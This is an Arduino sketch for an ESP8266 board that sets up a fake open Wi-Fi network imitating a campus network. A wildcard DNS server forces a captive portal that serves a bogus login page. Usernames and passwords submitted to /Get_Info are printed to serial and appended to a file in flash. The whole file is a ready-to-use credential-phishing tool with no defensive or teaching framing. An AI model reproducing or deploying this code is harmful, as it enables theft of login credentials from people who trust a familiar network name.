#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <FS.h>
#include <ESP8266WebServer.h>
 
const char* AP_NAME = "xxx校园网";//wifi名字

const byte DNS_PORT = 53;//DNS端口号
IPAddress apIP(192, 168, 4, 1);//esp8266-AP-IP地址
DNSServer dnsServer;//创建dnsServer实例
ESP8266WebServer server(80);//创建WebServer


void handleRoot() {//访问主页回调函数

    // 获取用户请求网址信息
  String webAddress = server.uri();
  if(webAddress=="/Get_Info"){
  Serial.print("用户名:"); Serial.println(server.arg("userName"));
  Serial.print("密码"); Serial.println(server.arg("password"));
        //确认闪存中是否有file_name文件
      String file_name="/info.txt";
      if (SPIFFS.exists(file_name)){
        Serial.print(file_name);
        Serial.println(" FOUND.");
        File dataFile = SPIFFS.open(file_name, "a");// 建立File对象用于向SPIFFS中的file对象（即/notes.txt）写入信息
        dataFile.println("用户名:"); // 向dataFile添加字符串信息
        dataFile.println(server.arg("userName"));
        dataFile.println("   密码:");
        dataFile.println(server.arg("password"));
        dataFile.println("\n\r"); 
        dataFile.close();                           // 完成文件操作后关闭文件   
        Serial.println("Finished Appending data to SPIFFS");
    } else {
        Serial.print(file_name);
        Serial.print(" NOT FOUND.");
        }
  }
if(webAddress.endsWith(".css")or webAddress.endsWith(".js")){
  if (SPIFFS.exists(webAddress)){
  Serial.print(webAddress);Serial.println("文件存在！");
  String contentType = getContentType(webAddress);
  File file = SPIFFS.open(webAddress, "r");          // 则尝试打开该文件
  server.streamFile(file,contentType);// 并且将该文件返回给浏览器
  file.close();  // 并且关闭文件
  }else{
    server.send(404, "text/plain", "404 Not Found"); 
  }
}


  if (!webAddress.endsWith(".htm")) {
    if(!webAddress.endsWith(".css")){
      if(!webAddress.endsWith(".js")){
         if(!webAddress.endsWith(".ico")){

            webAddress = "/index.html";                     // 则将访问地址修改为/index.html便于SPIFFS访问
            File file = SPIFFS.open(webAddress, "r");          // 则尝试打开该文件
            server.streamFile(file,"text/html");// 并且将该文件返回给浏览器
            file.close();  // 并且关闭文件
          }
      }
    }

 }

}

// 获取文件类型
String getContentType(String filename){
  if(filename.endsWith(".htm")) return "text/html";
  else if(filename.endsWith("/")) return "text/html";
  else if(filename.endsWith(".html")) return "text/html";
  else if(filename.endsWith(".css")) return "text/css";
  else if(filename.endsWith(".js")) return "application/javascript";
  return "text/plain";
}
 
 
void initBasic(void){//初始化基础
  Serial.begin(115200);
  WiFi.hostname("Smart-ESP8266");//设置ESP8266设备名
}
 
void initSoftAP(void){//初始化AP模式
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  if(WiFi.softAP(AP_NAME)){
    Serial.println("ESP8266 SoftAP is right");
  }
}
 
void initWebServer(void){//初始化WebServer
  //server.on("/",handleRoot);
  //上面那行必须以下面这种格式去写否则无法强制门户
  server.on("/", HTTP_GET, handleRoot);//设置主页回调函数
  server.onNotFound(handleRoot);//设置无法响应的http请求的回调函数
  server.on("/", HTTP_POST, handleRoot);//设置Post请求回调函数
  server.begin();//启动WebServer
  Serial.println("WebServer started!");
}
 
void initDNS(void){//初始化DNS服务器
  if(dnsServer.start(DNS_PORT, "*", apIP)){//判断将所有地址映射到esp8266的ip上是否成功
    Serial.println("start dnsserver success.");
  }
  else Serial.println("start dnsserver failed.");
}

 void connectNewWifi(void){
  WiFi.mode(WIFI_STA);//切换为STA模式
  WiFi.setAutoConnect(true);//设置自动连接
  WiFi.begin();//连接上一次连接成功的wifi
  Serial.println("");
  Serial.print("Connect to wifi");
  int count = 0;
   while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    count++;
    if(count > 10){//如果5秒内没有连上，就开启Web配网 可适当调整这个时间
      initSoftAP();
      initWebServer();
      initDNS();
      break;//跳出 防止无限初始化
    }
    Serial.print(".");
  }
  Serial.println("");
  if(WiFi.status() == WL_CONNECTED){//如果连接上 就输出IP信息 防止未连接上break后会误输出
    Serial.println("WIFI Connected!");
    Serial.print("IP address: ");
    Serial.println(WiFi.localIP());//打印esp8266的IP地址
    server.stop();
  }
}
void setup() {
  String file_name = "/index.html"; 
  initBasic();
  connectNewWifi();
  
  Serial.begin(9600);
  SPIFFS.begin();                             //启动SPIFFS
  Serial.println("SPIFFS Started.");
  if (SPIFFS.exists(file_name)){
    Serial.print(file_name);
    Serial.println(" FOUND.");
  } else {
    Serial.print(file_name);
    Serial.print(" NOT FOUND.");
  }
}
 
void loop() {
  server.handleClient();
  dnsServer.processNextRequest();
}
